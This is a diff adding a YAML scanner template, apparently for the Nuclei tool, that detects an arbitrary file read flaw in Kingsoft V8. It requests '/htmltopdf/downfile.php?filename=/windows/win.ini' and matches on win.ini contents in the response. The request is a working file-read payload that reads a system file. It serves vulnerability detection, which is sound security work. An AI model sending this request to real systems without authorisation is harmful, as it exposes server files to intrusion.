@@ -1,0 +1,28 @@
+id: kingsoft-v8-file-read
+info:
+  name: Kingsoft V8 File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects potential file read vulnerabilities in Kingsoft V8 by checking for specific file content.
+
+http:
+  - method: GET
+    path:
+      - "/htmltopdf/downfile.php?filename=/windows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "for 16-bit app support"
+          - "[extensions]"
+        condition: or
+      - type: word
+        part: header
+        words:
+          - "Content-Type: application/zip"
